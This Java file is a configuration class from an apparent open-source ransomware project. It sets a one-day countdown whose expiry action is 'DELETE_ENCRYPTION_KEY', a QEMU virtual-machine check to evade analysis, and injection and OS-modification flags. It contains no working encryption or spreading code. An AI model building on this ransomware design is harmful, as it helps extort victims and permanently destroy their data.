package com.bechris100.open_ransomware;

import java.util.ArrayList;
import java.util.List;

public class RansomwareClass {

    public static boolean osValueModificationsEnabled = true;

    public enum PreferredOperatingSystem {
        ANY,
        WINDOWS,
        LINUX
    }

    public static int timeoutDays = 1;
    public static int timeoutHours = 0;
    public static int timeoutMinutes = 0;
    public static int timeoutSeconds = 0;
    // this practically uses for the whole countdown stuff.
    public static int timeoutMilliseconds = 0;

    public static PreferredOperatingSystem preferredOs = PreferredOperatingSystem.ANY;
    public static boolean globalInjection = false;
    public static boolean virtualMachineCheck = false;
    public static String javaVmOsNameModified = "The Name of your current running Operating System cannot be modified for this configuration.";
    public static String javaVmOsArchModified = "The Architecture of your current running Operating System and/or Hardware cannot be modified for this configuration.";
    public static String javaVmOsVersionModified = "The Version of your current running Operating System cannot be modified for this configuration.";

    public static String timeoutAction = "DELETE_ENCRYPTION_KEY";

    public static List<String> getVmCheckers() {
        List<String> list = new ArrayList<>();
        list.add("qemu");

        return list;
    }

}
